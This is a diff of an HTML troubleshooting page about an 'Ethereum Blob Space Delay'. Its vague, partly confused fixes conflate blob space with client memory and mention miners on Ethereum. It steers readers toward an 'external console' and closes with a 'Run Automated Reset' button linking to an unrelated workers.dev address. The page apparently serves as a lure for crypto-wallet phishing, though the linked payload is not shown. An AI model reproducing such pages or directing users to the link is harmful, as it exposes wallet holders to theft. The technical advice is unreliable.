@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: sans-serif;
-        background: #1a1a24;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff9455; }
     .btn {
-        background: #cf6679;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,34 +42,33 @@
 <h1>Ethereum Blob Space Delay</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience delayed or failed transactions on the Ethereum network, with error messages indicating a blob space delay. This issue manifests as slow transaction processing times, causing frustration and potential financial losses.</li>
+<li>Users experience delayed or failed transactions due to congestion in the Ethereum network, resulting in increased blob space usage and slower than expected transaction processing times.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The Ethereum blob space delay occurs due to congestion on the Ethereum network, where the demand for transaction processing exceeds the available capacity. This leads to a backlog of unprocessed transactions, resulting in delays and increased gas fees.</li>
+<li>The error occurs when the Ethereum network is experiencing high traffic, causing a backlog of unprocessed transactions and leading to increased memory usage by the Ethereum client, resulting in delayed transaction processing.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To mitigate the Ethereum blob space delay, users can attempt the following:</li>
-<li>Increase the gas price to prioritize their transactions</li>
-<li>Use a different Ethereum node or provider to potentially bypass congested networks</li>
-<li>Implement a retry mechanism with exponential backoff to reattempt failed transactions</li>
+<li>Increase the <code>--cache.size</code> parameter to allow for more memory allocation:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;gas&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x15f90&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;gasPrice&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x186a0&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x0&quot;</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>geth<span class="w"> </span>--cache.size<span class="w"> </span><span class="m">4096</span>
 </code></pre></div>
 
-<p>Consider utilizing an alternative console for more advanced troubleshooting and configuration options.</p>
+<ul>
+<li>Implement a custom gas price strategy to prioritize transactions:</li>
+<li>Set a higher gas price to incentivize miners to process transactions quickly</li>
+<li>Use a gas price oracle to dynamically adjust gas prices based on network conditions</li>
+<li>Configure the Ethereum client to use a custom gas price strategy</li>
+</ul>
+<p>Consider utilizing an external console for more advanced troubleshooting and configuration options. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Basic understanding of Ethereum transaction processing</li>
-<li>Familiarity with gas pricing and network congestion</li>
-<li>Access to an Ethereum wallet or transaction management tool</li>
+<li>Ethereum client (e.g. Geth) installed and configured</li>
+<li>Sufficient system resources (CPU, memory, storage) to support Ethereum client operation</li>
+<li>Basic understanding of Ethereum network configuration and transaction processing</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-p0-investigate-and-cap-multichain-account-cr.html">Metamask Extension P0 Investigate And Cap Multichain Account Creation/Syncing Span Fan-Out</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-assets-confirming-the-add-token-from-a-d.html">Metamask Extension Bug Assets Confirming The Add Token From A D</a></li><li><a href="./archive/2026/06/metamask-extension-bug-multiple-wallets-syncdiscovery-for-socia.html">Metamask Extension Bug Multiple Wallets Syncdiscovery For Social</a></li><li><a href="./archive/2026/06/metamask-extension-bug-permissions-removing-hardware-wallet-acc.html">Metamask Extension Bug Permissions Removing Hardware Wallet Acc</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
